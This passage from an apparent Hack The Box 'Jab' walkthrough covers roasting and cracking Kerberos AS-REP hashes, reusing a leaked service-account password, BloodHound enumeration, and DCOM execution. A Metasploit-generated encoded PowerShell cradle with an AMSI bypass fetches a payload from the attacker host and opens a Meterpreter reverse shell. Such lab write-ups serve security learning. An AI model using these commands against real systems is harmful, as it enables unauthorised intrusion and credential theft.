</span></span><span style="display:flex;"><span>$krb5asrep$23$jmontgomery@JAB.HTB:0a06d2b4cc9e47a648a2d9d8140e04ba$131f41d363e08e682c841f6fc8ef6de56329b4cae121fa400ab817ffd63a87341fb5471c26891d8574640c0db206e92f6b590951a0a561c5a31a63247294ba568a1fc9ab52962a7c7a150623639eb0a413a293906ca0ced0e4a84e306e26102660e03eef6ad85f7c8e04d385ad6be5b33ca386b22e317517e68b7067caa0b095c0cfa4ce35904420ba65bba481da6ab1594fd1feceb39ae811f8d15af63db82e4a4145f4b90a0503de3c39542ad901c7710b5ba38fdac833a6de0d2a9b89050d782b6510923a8b6f3f2f7d671a18700383b5fe9a42467b89e6819ddd26cedfd01780
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User jmoore doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User jmoreno doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>&lt;---snip---&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User lbell doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$krb5asrep$23$lbradford@JAB.HTB:db1c3b7604945f4264780698530ea00a$dcbbacefc69dbe2d54526509e524df8e38cce73432344590c470c7643c44f498090395a087c238d2d5a4362ca0a4edefccaff8881f244abf9b14c797ebf5ee746a1b855948f3c47cbff320caee3a8acc9f1f7541af27d54e3f99deef1d00ebaf96e27cd0411b096171f431205c790cc45bd3b38b693619558502b32aed78dd7667b871341519a7e0beb229634925c07655c3176eb06b4d3789a282d48ec7b8ddace92a4060e615589aa502106be30dbd31e91739dabf21a7ea5a9084d9eb5fe9f468db55f729b63889c044b7c2203846f4c4e8ff6204f2ea6557436e43237d28d356
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User lbradley doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>&lt;---snip---&gt;
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> User mlondon doesn<span style="color:#e6db74">&#39;t have UF_DONT_REQUIRE_PREAUTH set
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">$krb5asrep$23$mlowe@JAB.HTB:c485728b0cd9d4144bdd0d19b3060ecc$ae3dc6afcf338e061ad0de02de0eecf7f928c43f625bfe9422e5255b5a54491fb86430f79052304de8f2b7335c0dee0ea63b04bbadc2c6de98e59f300e7b526a8adcaa49e23cc92338ccfe1bba84780ac860a8195cc88282557369278b156e1c8cc7c393cd8c80c7936cf1de8a03c525983849982d70e3d105530b74732ed593349c943d3eb53d1aad206d6a5eb36a903c27d608d03397ebcca4e1ce56ebea5168d7a9dc3f96f4a4e6db6ac04166f7535a2208401f037529217bc69e3acc08265a3af3a244e71677134ca8bb37cae5273aed677209e0eb1277fd807e99cac0a5a6f4
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[-] User mlucas doesn&#39;</span>t have UF_DONT_REQUIRE_PREAUTH set
</span></span><span style="display:flex;"><span>&lt;---snip---&gt;
</span></span></code></pre></div><p>That was worthwhile&hellip; we were able to grab 3 kerberos hashes to try and crack.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ hashcat hashes.txt /usr/share/wordlists/rockyou.txt.gz -m <span style="color:#ae81ff">18200</span>
</span></span><span style="display:flex;"><span>hashcat <span style="color:#f92672">(</span>v6.2.6<span style="color:#f92672">)</span> starting
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$krb5asrep$23$jmontgomery@JAB.HTB:0a06d2b4cc9e47a648a2d9d8140e04ba$131f41d363e08e682c841f6fc8ef6de56329b4cae121fa400ab817ffd63a87341fb5471c26891d8574640c0db206e92f6b590951a0a561c5a31a63247294ba568a1fc9ab52962a7c7a150623639eb0a413a293906ca0ced0e4a84e306e26102660e03eef6ad85f7c8e04d385ad6be5b33ca386b22e317517e68b7067caa0b095c0cfa4ce35904420ba65bba481da6ab1594fd1feceb39ae811f8d15af63db82e4a4145f4b90a0503de3c39542ad901c7710b5ba38fdac833a6de0d2a9b89050d782b6510923a8b6f3f2f7d671a18700383b5fe9a42467b89e6819ddd26cedfd01780:Midnight_121
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Session..........: hashcat
</span></span><span style="display:flex;"><span>Status...........: Exhausted
</span></span><span style="display:flex;"><span>Hash.Mode........: <span style="color:#ae81ff">18200</span> <span style="color:#f92672">(</span>Kerberos 5, etype 23, AS-REP<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Hash.Target......: hashes.txt
</span></span><span style="display:flex;"><span>Time.Started.....: Wed Feb  <span style="color:#ae81ff">5</span> 14:42:40 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">8</span> secs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Time.Estimated...: Wed Feb  <span style="color:#ae81ff">5</span> 14:42:48 <span style="color:#ae81ff">2025</span> <span style="color:#f92672">(</span><span style="color:#ae81ff">0</span> secs<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Kernel.Feature...: Pure Kernel
</span></span><span style="display:flex;"><span>Guess.Base.......: File <span style="color:#f92672">(</span>/usr/share/wordlists/rockyou.txt.gz<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Guess.Queue......: 1/1 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Speed.#1.........:  3564.6 kH/s <span style="color:#f92672">(</span>0.97ms<span style="color:#f92672">)</span> @ Accel:1024 Loops:1 Thr:1 Vec:4
</span></span><span style="display:flex;"><span>Recovered........: 1/3 <span style="color:#f92672">(</span>33.33%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>total<span style="color:#f92672">)</span>, 0/3 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span> Digests <span style="color:#f92672">(</span>new<span style="color:#f92672">)</span>, 1/3 <span style="color:#f92672">(</span>33.33%<span style="color:#f92672">)</span> Salts
</span></span><span style="display:flex;"><span>Progress.........: 43033155/43033155 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Rejected.........: 0/43033155 <span style="color:#f92672">(</span>0.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Restore.Point....: 14344385/14344385 <span style="color:#f92672">(</span>100.00%<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Restore.Sub.#1...: Salt:2 Amplifier:0-1 Iteration:0-1
</span></span><span style="display:flex;"><span>Candidate.Engine.: Device Generator
</span></span><span style="display:flex;"><span>Candidates.#1....: $HEX<span style="color:#f92672">[</span>206b72697374656e616e6e65<span style="color:#f92672">]</span> -&gt; $HEX<span style="color:#f92672">[</span>042a0337c2a156616d6f732103<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>Hardware.Mon.#1..: Util: 89%
</span></span></code></pre></div><p>And now we&rsquo;ve got a set of credentials for the machine: <code>jmontgomery:Midnight_121</code></p>
<h3 id="back-to-xmpp">Back to XMPP</h3>
<p>We&rsquo;ve logged back into XMPP via Pidgin, this time as user <code>jmontgomery</code>. When we view the Room List, we see a room we didn&rsquo;t see before: <code>pentest2003</code></p>
<p><img src="/images/jab7.png" alt="jab7">
<img src="/images/jab8.png" alt="jab8"></p>
<p>Looks like there was a discussion of findings from a previous penetration test, where a service account <code>svc_openfire</code> was kerberoasted, and password ultimately cracked: <code>!@#$%^&amp;*(1qazxsw</code></p>
<p>A quick check using <code>netexec</code> shows these credentials are still valid, and have not been fixed.</p>
<h3 id="bloodhound-enumeration">Bloodhound Enumeration</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ bloodhound-python -d jab.htb -u svc_openfire@jab.htb -p <span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>  -ns 10.129.230.215 --dns-tcp -c all
</span></span><span style="display:flex;"><span>INFO: BloodHound.py <span style="color:#66d9ef">for</span> BloodHound LEGACY <span style="color:#f92672">(</span>BloodHound 4.2 and 4.3<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>INFO: Found AD domain: jab.htb
</span></span><span style="display:flex;"><span>INFO: Getting TGT <span style="color:#66d9ef">for</span> user
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.jab.htb
</span></span><span style="display:flex;"><span>WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">1</span> domains in the forest
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">502</span> computers
</span></span><span style="display:flex;"><span>INFO: Connecting to LDAP server: dc01.jab.htb
</span></span><span style="display:flex;"><span>WARNING: LDAP Authentication is refused because LDAP signing is enabled. Trying to connect over LDAPS instead...
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2687</span> users
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">162</span> groups
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">2</span> gpos
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">21</span> ous
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">19</span> containers
</span></span><span style="display:flex;"><span>INFO: Found <span style="color:#ae81ff">0</span> trusts
</span></span><span style="display:flex;"><span>INFO: Starting computer enumeration with <span style="color:#ae81ff">10</span> workers
</span></span><span style="display:flex;"><span>INFO: Done in 02M 14S
</span></span></code></pre></div><p><img src="/images/jab9.png" alt="jab9"></p>
<p>Looks like <code>svc_openfire</code> has ExecuteDCOM permissions over <code>dc01.jab.htb</code></p>
<h3 id="dcom">DCOM</h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ impacket-dcomexec jab.htb/svc_openfire:<span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@jab.htb   
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> SMBv3.0 dialect used
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>-<span style="color:#f92672">]</span> DCOM SessionError: code: 0x8000401a - CO_E_RUNAS_LOGON_FAILURE - The server process could not be started because the configured identity is incorrect. Check the user name and password.
</span></span></code></pre></div><p>Interesting. We know the credentials are valid from testing them out using <code>netexec</code> earlier&hellip; let&rsquo;s play with some of the parameters in <code>dcomexec</code> and see if we can get it working. Turns out we have to use <code>-object MMC20</code> and <code>-silentcommand</code> to gain execution.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ impacket-dcomexec jab.htb/svc_openfire:<span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@10.129.230.215 <span style="color:#e6db74">&#39;ping 10.10.14.172&#39;</span> -silentcommand -object MMC20
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>// second terminal window
</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ sudo tcpdump -ni tun0 icmp
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>sudo<span style="color:#f92672">]</span> password <span style="color:#66d9ef">for</span> pl4stic: 
</span></span><span style="display:flex;"><span>tcpdump: verbose output suppressed, use -v<span style="color:#f92672">[</span>v<span style="color:#f92672">]</span>... <span style="color:#66d9ef">for</span> full protocol decode
</span></span><span style="display:flex;"><span>listening on tun0, link-type RAW <span style="color:#f92672">(</span>Raw IP<span style="color:#f92672">)</span>, snapshot length <span style="color:#ae81ff">262144</span> bytes
</span></span><span style="display:flex;"><span>15:31:55.976027 IP 10.129.230.215 &gt; 10.10.14.172: ICMP echo request, id 1, seq 247, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:55.976087 IP 10.10.14.172 &gt; 10.129.230.215: ICMP echo reply, id 1, seq 247, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:57.000052 IP 10.129.230.215 &gt; 10.10.14.172: ICMP echo request, id 1, seq 248, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:57.000091 IP 10.10.14.172 &gt; 10.129.230.215: ICMP echo reply, id 1, seq 248, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:57.951535 IP 10.129.230.215 &gt; 10.10.14.172: ICMP echo request, id 1, seq 249, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:57.951557 IP 10.10.14.172 &gt; 10.129.230.215: ICMP echo reply, id 1, seq 249, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:59.048229 IP 10.129.230.215 &gt; 10.10.14.172: ICMP echo request, id 1, seq 250, length <span style="color:#ae81ff">40</span>
</span></span><span style="display:flex;"><span>15:31:59.048276 IP 10.10.14.172 &gt; 10.129.230.215: ICMP echo reply, id 1, seq 250, length <span style="color:#ae81ff">40</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>msfconsole
</span></span><span style="display:flex;"><span>msf6 &gt; use exploit/multi/script/web_delivery
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set target <span style="color:#ae81ff">2</span>      // PowerShell
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set payload windows/x64/meterpreter/reverse_tcp
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; set lhost tun0
</span></span><span style="display:flex;"><span>msf6 exploit<span style="color:#f92672">(</span>multi/script/web_delivery<span style="color:#f92672">)</span> &gt; run
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit running as background job 0.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Exploit completed, but no session was created.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Started reverse TCP handler on 10.10.14.172:4444 
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Using URL: http://10.10.14.172:8080/AMwSYcTcwqz
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Server started.
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Run the following command on the target machine:
</span></span><span style="display:flex;"><span>powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABnADgAbwBrAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGcAOABvAGsALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABnADgAbwBrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6AC8AeAA4ADMARgBmAHkATwA1AEoAUwBZAGQAdwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6ACcAKQApADsA
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>pl4stic㉿shattersec<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/htb/jab<span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>└─$ impacket-dcomexec jab.htb/svc_openfire:<span style="color:#e6db74">&#39;!@#$%^&amp;*(1qazxsw&#39;</span>@10.129.230.215 <span style="color:#e6db74">&#39;powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABnADgAbwBrAD0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwBpAGYAKABbAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBQAHIAbwB4AHkAXQA6ADoARwBlAHQARABlAGYAYQB1AGwAdABQAHIAbwB4AHkAKAApAC4AYQBkAGQAcgBlAHMAcwAgAC0AbgBlACAAJABuAHUAbABsACkAewAkAGcAOABvAGsALgBwAHIAbwB4AHkAPQBbAE4AZQB0AC4AVwBlAGIAUgBlAHEAdQBlAHMAdABdADoAOgBHAGUAdABTAHkAcwB0AGUAbQBXAGUAYgBQAHIAbwB4AHkAKAApADsAJABnADgAbwBrAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6AC8AeAA4ADMARgBmAHkATwA1AEoAUwBZAGQAdwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA0AC4AMQA3ADIAOgA4ADAAOAAwAC8AQQBNAHcAUwBZAGMAVABjAHcAcQB6ACcAKQApADsA&#39;</span> -silentcommand -object MMC20
</span></span><span style="display:flex;"><span>Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.230.215   web_delivery - Delivering AMSI Bypass <span style="color:#f92672">(</span><span style="color:#ae81ff">1375</span> bytes<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> 10.129.230.215   web_delivery - Delivering Payload <span style="color:#f92672">(</span><span style="color:#ae81ff">3701</span> bytes<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Sending stage <span style="color:#f92672">(</span><span style="color:#ae81ff">203846</span> bytes<span style="color:#f92672">)</span> to 10.129.230.215
</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Meterpreter session <span style="color:#ae81ff">1</span> opened <span style="color:#f92672">(</span>10.10.14.172:4444 -&gt; 10.129.230.215:55707<span style="color:#f92672">)</span> at 2025-02-05 15:39:15 -0500
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>meterpreter &gt; getuid
</span></span><span style="display:flex;"><span>Server username: JAB<span style="color:#ae81ff">\s</span>vc_openfire
</span></span><span style="display:flex;"><span>meterpreter &gt; sysinfo
</span></span><span style="display:flex;"><span>Computer        : DC01
</span></span><span style="display:flex;"><span>OS              : Windows Server <span style="color:#ae81ff">2019</span> <span style="color:#f92672">(</span>10.0 Build 17763<span style="color:#f92672">)</span>.
</span></span><span style="display:flex;"><span>Architecture    : x64
</span></span><span style="display:flex;"><span>System Language : en_US
</span></span><span style="display:flex;"><span>Meterpreter     : x64/windows
</span></span></code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="openfire-admin-console">OpenFire Admin Console</h3>
<p>Doing some enumeration, we can see there&rsquo;s an additional OpenFire endpoint open locally on <code>9090</code> and <code>9091</code>.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>meterpreter &gt; netstat -ino
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Connection list
</span></span><span style="display:flex;"><span><span style="color:#f92672">===============</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    Proto  Local address         Remote address        State        User  Inode  PID/Program name
</span></span><span style="display:flex;"><span>    -----  -------------         --------------        -----        ----  -----  ----------------
</span></span><span style="display:flex;"><span>&lt;---snip---&gt;
</span></span><span style="display:flex;"><span>    tcp    127.0.0.1:9090        0.0.0.0:*             LISTEN       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>      3284/openfire-service.exe
</span></span><span style="display:flex;"><span>    tcp    127.0.0.1:9091        0.0.0.0:*             LISTEN       <span style="color:#ae81ff">0</span>     <span style="color:#ae81ff">0</span>      3284/openfire-service.exe
</span></span></code></pre></div><p>Browsing the computer&rsquo;s files, we also come across an interesting configuration file, <code>C:\Program Files\Openfire\conf\openfire.xml</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    This file stores bootstrap properties needed by Openfire.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    Property names must be in the format: &#34;prop.name.is.blah=value&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    That will be stored as:
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        &lt;prop&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            &lt;name&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                &lt;is&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                    &lt;blah&gt;value&lt;/blah&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">                &lt;/is&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">            &lt;/name&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        &lt;/prop&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    Most properties are stored in the Openfire database. A
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    property viewer and editor is included in the admin console.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">--&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!-- root element, all properties must be under this element --&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;jive&gt;</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;adminConsole&gt;</span> 
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">&lt;!-- Disable either port by setting the value to -1 --&gt;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;port&gt;</span>9090<span style="color:#f92672">&lt;/port&gt;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;securePort&gt;</span>9091<span style="color:#f92672">&lt;/securePort&gt;</span>  
</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;interface&gt;</span>127.0.0.1<span style="color:#f92672">&lt;/interface&gt;</span> 
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;/adminConsole&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#f92672">&lt;locale&gt;</span>en<span style="color:#f92672">&lt;/locale&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!-- Network settings. By default, Openfire will bind to all network interfaces.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      Alternatively, you can specify a specific network interfaces that the server
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      will listen on. For example, 127.0.0.1. This setting is generally only useful
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">       on multi-homed servers. --&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;network&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        &lt;interface&gt;&lt;/interface&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;/network&gt;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    --&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">        One time token to gain temporary access to the admin console.
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    --&gt;</span>  
</span></span><span style="display:flex;"><span>  <span style="color:#75715e">&lt;!--
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    &lt;oneTimeAccessToken&gt;secretToken&lt;/oneTimeAccessToken&gt;
